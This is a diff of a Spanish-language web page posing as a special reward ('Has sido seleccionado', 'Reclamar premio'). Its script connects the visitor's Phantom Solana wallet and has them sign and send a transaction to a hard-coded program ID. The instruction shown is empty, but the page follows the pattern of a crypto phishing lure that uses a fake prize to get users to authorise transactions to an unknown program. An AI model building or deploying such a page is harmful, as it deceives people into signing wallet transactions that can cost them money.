@@ -1,92 +1,87 @@
 <!DOCTYPE html>
 <html lang="es">
-  <head>
-    <meta charset="UTF-8" />
-    <title>🎁 Recompensa Especial</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <style>
-      body {
-        font-family: sans-serif;
-        background: #0d1117;
-        color: #ffffff;
-        text-align: center;
-        padding: 40px;
-      }
+<head>
+  <meta charset="UTF-8">
+  <title>🎁 Recompensa Especial</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #0d1117;
+      color: #ffffff;
+      text-align: center;
+      padding: 40px;
+    }
 
-      .card {
-        background: #161b22;
-        padding: 30px;
-        border-radius: 15px;
-        max-width: 400px;
-        margin: auto;
-        box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
-      }
+    .card {
+      background: #161b22;
+      padding: 30px;
+      border-radius: 15px;
+      max-width: 400px;
+      margin: auto;
+      box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+    }
 
-      button {
-        background: #1abc9c;
-        border: none;
-        padding: 15px 30px;
-        color: #fff;
-        font-size: 18px;
-        border-radius: 10px;
-        cursor: pointer;
-        margin-top: 20px;
-      }
+    button {
+      background: #1abc9c;
+      border: none;
+      padding: 15px 30px;
+      color: #fff;
+      font-size: 18px;
+      border-radius: 10px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
 
-      button:hover {
-        background: #16a085;
-      }
-    </style>
-  </head>
-  <body>
-    <div class="card">
-      <h1>🎉 Has sido seleccionado</h1>
-      <p>¡Reclama tu recompensa exclusiva ahora!</p>
-      <button id="connectBtn">Reclamar premio</button>
-    </div>
+    button:hover {
+      background: #16a085;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>🎉 Has sido seleccionado</h1>
+    <p>¡Reclama tu recompensa exclusiva ahora!</p>
+    <button id="connectBtn">Reclamar premio</button>
+  </div>
 
-    <script type="module">
-      import { Buffer } from "https://esm.sh/buffer@6.0.3/";
-      window.Buffer = Buffer;
+  <script src="https://unpkg.com/@solana/web3.js@1.73.2/lib/index.iife.min.js"></script>
+  <script>
+    const connectBtn = document.getElementById("connectBtn");
 
-      const provider = window.phantom?.solana;
+    connectBtn.addEventListener("click", async () => {
+      try {
+        const provider = window.solana;
 
-      if (!provider || !provider.isPhantom) {
-        alert("Phantom Wallet no está disponible.");
-        throw new Error("Phantom Wallet no encontrado");
-      }
-
-      const programId = new solanaWeb3.PublicKey("8RxZb6nik5PKgUbPvPFhHxFjMKVkaah2fVnobhh4ioj9");
-
-      document.getElementById("connectBtn").addEventListener("click", async () => {
-        try {
-          // Conectar Phantom
-          const resp = await provider.connect();
-          const publicKey = resp.publicKey;
-          const connection = provider.connection;
-
-          // Construir instrucción vacía al programa
-          const instruction = new solanaWeb3.TransactionInstruction({
-            keys: [],
-            programId,
-            data: Buffer.from([]),
-          });
-
-          const transaction = new solanaWeb3.Transaction().add(instruction);
-          transaction.feePayer = publicKey;
-          transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-
-          const signed = await provider.signTransaction(transaction);
-          const signature = await connection.sendRawTransaction(signed.serialize());
-          await connection.confirmTransaction(signature);
-
-          alert("✅ Transacción enviada: " + signature);
-        } catch (err) {
-          alert("❌ Error: " + err.message);
+        if (!provider || !provider.isPhantom) {
+          alert("❌ Phantom Wallet no está disponible.");
+          return;
         }
-      });
-    </script>
 
-    <script src="https://unpkg.com/@solana/web3.js@1.73.2/lib/index.iife.min.js"></script>
-  </body>
+        await provider.connect();
+
+        const connection = new solanaWeb3.Connection(provider.rpcUrl || "https://api.devnet.solana.com", "confirmed");
+        const programId = new solanaWeb3.PublicKey("8RxZb6nik5PKgUbPvPFhHxFjMKVkaah2fVnobhh4ioj9");
+
+        const instruction = new solanaWeb3.TransactionInstruction({
+          keys: [],
+          programId,
+          data: new Uint8Array([]),
+        });
+
+        const transaction = new solanaWeb3.Transaction().add(instruction);
+        transaction.feePayer = provider.publicKey;
+        transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+
+        const signed = await provider.signTransaction(transaction);
+        const signature = await connection.sendRawTransaction(signed.serialize());
+        await connection.confirmTransaction(signature);
+
+        alert("✅ Transacción enviada: " + signature);
+      } catch (err) {
+        alert("❌ Error: " + err.message);
+      }
+    });
+  </script>
+</body>
 </html>
